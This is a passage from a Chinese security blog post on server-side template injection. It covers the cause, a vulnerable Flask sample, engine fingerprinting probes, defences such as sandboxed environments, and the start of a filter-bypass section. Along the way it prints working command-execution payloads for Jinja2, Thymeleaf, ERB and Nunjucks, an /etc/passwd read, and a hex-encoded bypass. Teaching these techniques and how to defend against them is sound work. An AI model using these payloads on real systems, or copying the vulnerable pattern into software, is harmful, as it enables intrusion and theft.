-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SSTI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-21T13:33:50.000Z" title="发表于 2025-03-21 21:33:50">2025-03-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-23T08:17:37.305Z" title="更新于 2025-04-23 16:17:37">2025-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p><strong>漏洞原理：</strong></p>
<p>通过<strong>向模板引擎注入恶意代码</strong>，在服务器端执行任意操作的漏洞。其核心是应用程序将用户输入直接拼接到模板中，导致攻击者能操控模板解析逻辑，绕过业务限制实现代码执行、文件读取或权限提升。</p>
<p><strong>核心机制:</strong></p>
<ul>
<li><p>模板引擎功能：模板引擎（如<code>Jinja2</code>、<code>Thymeleaf</code>、<code>Freemarker</code>）用于动态生成HTML，支持变量插值、逻辑控制（如循环、条件判断）</p>
</li>
<li><p>用户输入拼接至模板：未过滤的用户输入被直接插入模板表达式，触发模板引擎的代码执行能力。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 漏洞代码示例（Python Flask + Jinja2）</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/greet/&lt;name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">f&quot;Hello, <span class="subst">&#123;name&#125;</span>!&quot;</span>)  <span class="comment"># 直接拼接用户输入</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>沙箱逃逸：许多模板引擎默认运行在沙箱中，但攻击者通过特定语法或对象链（<code>Gadget Chains</code>）绕过限制，访问危险函数或系统命令</p>
</li>
</ul>
<p><strong>触发条件：</strong></p>
<ul>
<li>应用程序使用动态模板且未对用户输入进行严格过滤</li>
<li>模板引擎支持执行复杂逻辑或调用底层API（如执行命令、读写文件）</li>
</ul>
<h1 id="SSTI利用"><a href="#SSTI利用" class="headerlink" title="SSTI利用"></a>SSTI利用</h1><p><strong>攻击步骤：</strong></p>
<ul>
<li>探测模板类型：<ul>
<li>通过注入特殊符号（如<code>&#123;&#123;7*7&#125;&#125;</code>、<code>$&#123;7&amp;7&#125;</code>、<code>&lt;%= 7*7 %&gt;</code>）观察响应，判断模板引擎类型。<ul>
<li>jinja2: <code>&#123;&#123;7*7&#125;&#125;</code> -&gt; 页面显示<code>49</code></li>
<li>Twig: <code>&#123;&#123;7*7&#125;&#125;</code></li>
<li>Freemarker: <code>$&#123;7*7&#125;</code></li>
<li>Ruby ERB: <code>&lt;%= 7*7 %&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>构造恶意载荷：根据引擎语法调用危险函数或访问敏感数据对象</li>
</ul>
<p><strong>经典攻击载荷：</strong></p>
<ul>
<li><p><strong>Python Jinja2</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="variable language_">self</span>.__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read() &#125;&#125;</span><br><span class="line"><span class="comment"># 或短链绕过过滤：</span></span><br><span class="line">&#123;&#123; config.items()[<span class="number">4</span>][<span class="number">1</span>].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;id&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Java Thymeleaf</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;calc&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Ruby ERB</strong>：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= system(<span class="string">&quot;whoami&quot;</span>) %&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Node.js (Nunjucks)</strong>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&quot;pwnd&quot;</span> | reverse | <span class="built_in">escape</span> &#125;&#125;</span><br><span class="line">&#123;% <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;id&#x27;</span>) %&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>利用场景：</strong></p>
<ul>
<li><p>读取敏感文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;  <span class="comment"># 部分引擎支持</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>远程代码执行（RCE）：调用系统命令或反连Shell</p>
</li>
<li><p>环境信息泄露：通过模板内置对象（如<code>config</code>、<code>request</code>）获取数据库密码、密钥等</p>
</li>
</ul>
<h1 id="SSTI防御"><a href="#SSTI防御" class="headerlink" title="SSTI防御"></a>SSTI防御</h1><p><strong>禁用用户输入控制模板结构：</strong></p>
<ul>
<li>避免将用户输入直接拼接至模板表达式，使用静态模板占位符<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安全做法（Python Flask）</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;greet.html&#x27;</span>, name=name)  <span class="comment"># 模板中预先定义&#123;&#123; name &#125;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>严格过滤输入：</strong></p>
<ul>
<li>白名单校验：仅允许合法字符（如字母、数字），过滤<code>&#123;&#125;</code>、<code>$</code>、<code>&lt;%</code>等模板语法符号</li>
<li>上下文转义：对动态内容进行HTML转义（但无法防御直接代码执行）</li>
</ul>
<p><strong>沙箱隔离：</strong></p>
<ul>
<li>启用模板引擎的沙箱模式，限制可访问的类和函数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Jinja2沙箱示例</span></span><br><span class="line"><span class="keyword">from</span> jinja2.sandbox <span class="keyword">import</span> SandboxedEnvironment</span><br><span class="line">env = SandboxedEnvironment()</span><br><span class="line">template = env.from_string(template_str)</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>禁用危险功能：</strong></p>
<ul>
<li>移除或限制模板引擎的敏感方法（如<code>__import__</code>、<code>eval</code>、<code>os</code>模块）</li>
</ul>
<p><strong>使用更安全的模板引擎：</strong></p>
<ul>
<li>选择默认沙箱严格或功能受限的引擎（如<code>Jinja2</code>的沙箱模式、<code>Django</code>模板）</li>
</ul>
<h1 id="SSTI绕过"><a href="#SSTI绕过" class="headerlink" title="SSTI绕过"></a>SSTI绕过</h1><p><strong>语法变形与编码：</strong></p>
<ul>
<li><p>十六进制&#x2F;Unicode编码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&quot;\x5f\x5fimport\x5f\x5f&quot;</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;id&quot;</span>) &#125;&#125;  <span class="comment"># Jinja2</span></span><br></pre></td></tr></table></figure>
</li>
